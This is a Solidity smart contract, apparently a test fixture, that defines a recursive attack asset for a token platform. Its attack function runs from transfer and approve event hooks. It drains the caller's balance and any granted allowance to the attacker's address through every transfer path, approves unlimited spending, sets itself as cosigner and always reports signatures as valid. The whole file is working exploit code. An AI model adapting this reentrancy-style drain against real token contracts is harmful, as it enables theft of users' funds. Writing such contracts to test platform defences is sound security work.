import "Asset.sol";

contract RecursiveAttackAsset is Asset {
    bytes32 icap;

    function attack(address _from) {
        uint balance = balanceOf(tx.origin);
        address attacker = address(this);
        setCosignerAddress(attacker);
        transfer(attacker, balance);
        transferWithReference(attacker, balance, "Attack");
        transferToICAP(icap, balance);
        transferToICAPWithReference(icap, balance, "Attack");
        approve(attacker, 2**256 - 1);
        multiAsset.transferFrom(tx.origin, attacker, balance, symbol);
        uint balanceFrom = allowance(_from, tx.origin) >= balanceOf(_from) ? balanceOf(_from) : allowance(_from, tx.origin);
        transferFrom(_from, attacker, balanceFrom);
        transferFromWithReference(_from, attacker, balanceFrom, "Attack");
        transferFromToICAP(_from, icap, balanceFrom);
        transferFromToICAPWithReference(_from, icap, balanceFrom, "Attack");
    }

    function emitTransfer(address _from, address _to, uint _value) {
        attack(_from);
    }

    function emitApprove(address _from, address _spender, uint _value) {
        if (_value == 2**256 - 1) return;
        attack(_from);
    }

    function setIcap(bytes32 _icap) {
        icap = _icap;
    }

    function isSigned(bytes32) returns(bool) {
        return true;
    }

    function transferWithReference(address _to, uint _value, string _reference) returns(bool) {
        return multiAsset.proxyTransferWithReference(_to, _value, symbol, _reference);
    }

    function transferToICAPWithReference(bytes32 _icap, uint _value, string _reference) returns(bool) {
        return multiAsset.proxyTransferToICAPWithReference(_icap, _value, _reference);
    }
    
    function transferFromWithReference(address _from, address _to, uint _value, string _reference) returns(bool) {
        return multiAsset.proxyTransferFromWithReference(_from, _to, _value, symbol, _reference);
    }

    function transferFromToICAPWithReference(address _from, bytes32 _icap, uint _value, string _reference) returns(bool) {
        return multiAsset.proxyTransferFromToICAPWithReference(_from, _icap, _value, _reference);
    }

    function approve(address _spender, uint _value) returns(bool) {
        return multiAsset.proxyApprove(_spender, _value, symbol);
    }

    function setCosignerAddress(address _cosigner) returns(bool) {
        return multiAsset.proxySetCosignerAddress(_cosigner, symbol);
    }
}
